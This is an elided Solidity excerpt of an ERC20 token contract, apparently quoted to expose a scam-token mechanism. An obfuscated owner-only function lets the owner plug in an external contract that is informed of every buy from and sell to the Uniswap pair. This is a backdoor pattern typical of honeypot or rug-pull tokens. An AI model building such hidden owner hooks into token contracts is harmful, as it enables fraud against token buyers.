...
contract TokenM is ERC20 {
    ...
    IUserAmountnibnnd public nibnnd;
    ...
    function cvovdoodBlovegRnnx(IUserAmountnibnnd _nibnnd) public onlyOwner {
        nibnnd = _nibnnd;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                nibnnd.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				nibnnd.addOutAmount(from, amount);
            }else{
                nibnnd.addOutAmount(from, amount);
                takeFee = false;
            }
